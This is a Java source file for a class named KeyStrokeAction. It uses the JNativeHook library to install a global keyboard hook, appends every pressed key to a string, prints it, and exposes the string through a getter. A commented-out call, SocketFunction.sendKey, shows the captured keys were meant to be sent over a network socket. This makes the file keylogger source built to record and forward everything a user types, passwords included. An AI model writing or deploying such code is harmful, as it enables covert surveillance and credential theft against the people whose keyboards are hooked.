import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.PrintWriter;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class KeyStrokeAction implements NativeKeyListener, Runnable {
    public String keyStroke = "";
    private KeyStrokeAction keyStrokeAction;

    public KeyStrokeAction () {}
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        keyStroke = keyStroke + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        System.out.println(keyStroke);
//        SocketFunction.sendKey(keyStroke);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void run() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        keyStrokeAction = new KeyStrokeAction();
        GlobalScreen.addNativeKeyListener(keyStrokeAction);
    }

    public void stop() throws NativeHookException {
        GlobalScreen.unregisterNativeHook();
        System.out.println("stopped");
    }

    public String getKeyStroke() {
        return keyStrokeAction.keyStroke;
    }
}
